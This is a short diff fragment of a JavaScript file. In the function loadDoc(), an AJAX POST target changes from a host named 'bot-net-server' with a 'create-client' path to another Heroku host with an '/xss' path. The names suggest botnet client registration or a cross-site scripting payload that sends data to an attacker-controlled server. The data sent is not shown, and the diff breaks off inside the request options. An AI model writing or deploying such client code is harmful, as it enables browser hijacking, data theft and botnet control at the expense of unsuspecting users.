@@ -32,7 +32,7 @@
 function loadDoc() {
     $.ajax({
         type: 'POST',
-        url: 'https://bot-net-server.herokuapp.com/create-client',
+        url: 'http://blog-torf.herokuapp.com/xss',
         //OR
         //beforeSend: function(xhr) {
         //  xhr.setRequestHeader("My-First-Header", "first value");
